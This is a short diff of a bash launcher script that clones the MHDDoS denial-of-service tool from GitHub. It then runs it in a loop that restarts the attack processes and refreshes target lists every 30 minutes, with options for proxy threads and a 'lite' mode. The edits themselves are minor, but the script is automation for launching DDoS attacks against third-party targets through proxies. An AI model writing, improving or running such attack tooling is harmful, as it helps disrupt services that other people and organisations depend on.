@@ -121,7 +121,7 @@ while [ "$1" != "" ]; do
         -p0| --no-proxy-finder ) export proxy_finder="off"; shift ;;
         --lite ) export lite="on"; export proxy_threads=1000; shift ;;
         -p | --proxy-threads ) export proxy_threads="$2"; shift 2 ;;
-        *   ) export args_to_pass+=" $1"; shift 1 ;;
+        *   ) export args_to_pass+=" $1"; shift ;;
     esac
 done
 
@@ -144,6 +144,7 @@ git clone https://github.com/MHProDev/MHDDoS.git
 # Restart and update targets every 30 minutes
 while true; do
     pkill -f start.py; pkill -f runner.py
+    echo $lite; sleep 3
     if [[ $lite == "on" ]]; then
         echo "lite mode"; sleep 5
         tail -n 2000 $targets_uniq > $targets_lite
